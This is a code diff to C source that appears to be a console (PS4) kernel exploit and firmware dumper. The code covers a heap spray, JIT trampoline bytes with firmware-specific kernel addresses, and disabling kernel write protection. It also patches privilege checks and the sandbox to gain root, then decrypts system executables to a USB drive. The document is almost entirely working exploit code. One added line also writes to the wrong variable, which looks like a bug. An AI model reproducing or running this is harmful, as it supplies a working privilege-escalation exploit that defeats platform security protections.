@@ -6,7 +6,7 @@
 #include "dump_utils.h"
 #include "kernel_utils.h"
 
-static int sock;
+int sock;
 static void *dump;
 int fw_version;
 
@@ -39,11 +39,13 @@ void dlclose_payload(struct knote *kn)
     // Enable UART output
     uint16_t *securityflags = (uint16_t *)secflags;
     *securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0
-    
+
     // Disable write protection
     uint64_t cr0 = readCr0();
     writeCr0(cr0 & ~X86_CR0_WP);
     
+    //-------------- KERNEL PATCHES START --------------
+
     if (fw_version == 101) {
         // Patch authMgrSmInvokeCheck on 1.01
         // error -13 (0xfffffff3) to be 0 for decrypting root selfs, may not work first time but 2nd try does it
@@ -86,6 +88,8 @@ void dlclose_payload(struct knote *kn)
     kmem[3] = 0x90;
     kmem[4] = 0x90;
     
+    //-------------- KERNEL PATCHES END --------------
+
     // Restore write protection
     writeCr0(cr0);
     
@@ -112,6 +116,10 @@ void dlclose_payload(struct knote *kn)
     uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
     *sceProcCap = 0xFFFFFFFFFFFFFFFF;     // Sce Process
     
+	// Has SCE Program Attribute
+	uint64_t *sceProcAtt = (uint64_t *)(((char *)td_ucred) + 128);
+	*sceProcCap = *sceProcCap >> 31;
+
     ((uint64_t *)privchk1)[0] = 0x123456; // priv_check_cred bypass with suser_enabled=true
     ((uint64_t *)privchk2)[0] = 0;        // bypass priv_check
     
@@ -176,17 +184,21 @@ void *exploitThread(void *none)
     uint8_t trampolinecode[24] = { 0x58, 0x48, 0xB8 };
     uint8_t trampolinetail[13] = { 0x50, 0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, 0xFF, 0xE0 };
     
-    if (fw_version == 101) {
-        uint8_t fwspecific[8] = { 0x59, 0x7D, 0x46, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF82467D59
-        memcpy(trampolinecode + 3, fwspecific, 8);
-    } else if (fw_version == 152) {
-        uint8_t fwspecific[8] = { 0x89, 0xA8, 0x3F, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF823FA889
-        memcpy(trampolinecode + 3, fwspecific, 8);
-    } else {
+    if (fw_version == 176) 
+    {
         uint8_t fwspecific[8] = { 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF82403919
         memcpy(trampolinecode + 3, fwspecific, 8);
+    } 
+    else if (fw_version == 152)
+    {
+        uint8_t fwspecific[8] = { 0x89, 0xA8, 0x3F, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF823FA889
+        memcpy(trampolinecode + 3, fwspecific, 8);
+    } 
+    else 
+    {
+        uint8_t fwspecific[8] = { 0x59, 0x7D, 0x46, 0x82, 0xFF, 0xFF, 0xFF, 0xFF }; // 0xFFFFFFFF82467D59
+        memcpy(trampolinecode + 3, fwspecific, 8);
     }
-    
     memcpy(trampolinecode + 11, trampolinetail, 13);
     
     // Get Jit memory
@@ -223,7 +235,7 @@ void *exploitThread(void *none)
     // Spray the heap
     for (int i = 0; i < 50; i++) {
         allocation[i] = kernelAllocation(bufferSize, fd);
-        printfsocket("[ ] allocation = %llp\n", allocation[i]);
+        printfsocket("[ ] Allocation = %llp\n", allocation[i]);
     }
     
     // Create hole for the system call's allocation
@@ -241,15 +253,13 @@ void *exploitThread(void *none)
     
     // Close sockets
     for (int i = 0; i < 0x2000; i++) {
-        if (sockets[i] == -1)
-            break;
+        if (sockets[i] == -1) break;
         sceNetSocketClose(sockets[i]);
     }
     
     // Free allocations
-    for (int i = 0; i < 50; i++) {
+    for (int i = 0; i < 50; i++)
         kernelFree(allocation[i]);
-    }
     
     // Free the mapping
     munmap(mapping, mappingSize);
@@ -280,7 +290,6 @@ int _main(struct thread *td)
     initKernel();    
     initLibc();
     initNetwork();
-    initPthread();
     
 #ifdef DEBUG_SOCKET
     struct sockaddr_in server;
@@ -424,8 +433,10 @@ int _main(struct thread *td)
     
     printfsocket("[ ] Firmware: %d\n", fw_version);
     
-    if (fw_version < 315) {
+    if (fw_version < 315) 
+    {
         initJIT();
+        initPthread();
         
         //int (*printfkernel)(const char *fmt, ...) = (void *)printf;
         
@@ -433,49 +444,48 @@ int _main(struct thread *td)
         printfsocket("[ ] UID = %d\n", getuid());
         printfsocket("[ ] GID = %d\n", getgid());
         
-        if (getuid() != 0)
-        {
-            // Create exploit thread
-            if (scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0)
-            {
-                printfsocket("[-] pthread_create error\n");
-                return 0;
-            }
-            
-            // Wait for thread to exit
-            scePthreadJoin(thread, NULL);
-            
-            // At this point we should have root and jailbreak
-            if (getuid() != 0)
-            {
-                printfsocket("[-] Error: Kernel patch failed!\n");
-                sceNetSocketClose(sock);
-                return 1;
-            }
-            
-            printfsocket("[ ] Kernel patch success!\n");
+        printfsocket("[ ] Jailbreaking\n");
+
+        // Create exploit thread
+        if (scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
+            printfsocket("[-] Error: pthread_create failed!\n");
+            return 0;
         }
-    } else {
+            
+        // Wait for thread to exit
+        scePthreadJoin(thread, NULL);
+            
+        // At this point we should have root and jailbreak
+        if (getuid() != 0) {
+            printfsocket("[-] Error: Kernel patch failed!\n");
+            sceNetSocketClose(sock);
+            return 1;
+        }
+         
+        printfsocket("[ ] Kernel patch success!\n");
+    
+    } 
+    else
+    {
+        // hook our kernel print function
+        //void* kernel_base = &((uint8_t*)__readmsr(0xC0000082))[-xfast];
+        //int (*printfkernel)(const char *fmt, ...) = (void *)(kernel_base + printf);
+        
         printfsocket("[ ] Jailbreaking\n");
         
         // Patch some things in the kernel (sandbox, prison) to give userland more privileges...
         jailbreak(xfast, prison0, rootvn, hasmself, canmself, loadable);
         
-        // hook our kernel print function
-        //void* kernel_base = &((uint8_t*)__readmsr(0xC0000082))[-xfast];
-        //int (*printfkernel)(const char *fmt, ...) = (void *)(kernel_base + printf);
     }
     
-    // DuMp Em AlL! */
+    // DuMp Em AlL!
     char usb_name[64];
     char usb_path[64];
     char root_dir[64];
     
     // Get your USB drive ready
     if (!wait_for_usb(usb_name, usb_path)) {
-        do {
-            sceKernelSleep(1);
-        }
+        do sceKernelSleep(1);
         while (!wait_for_usb(usb_name, usb_path));
     }
     
@@ -485,6 +495,8 @@ int _main(struct thread *td)
     mkdir(root_dir, 0644);
     
     traverse_dir("/", root_dir, decrypt_self_to_elf);
+    
+    printfsocket("Done!\n");
     
 #ifdef DEBUG_SOCKET
     munmap(dump, PAGE_SIZE);
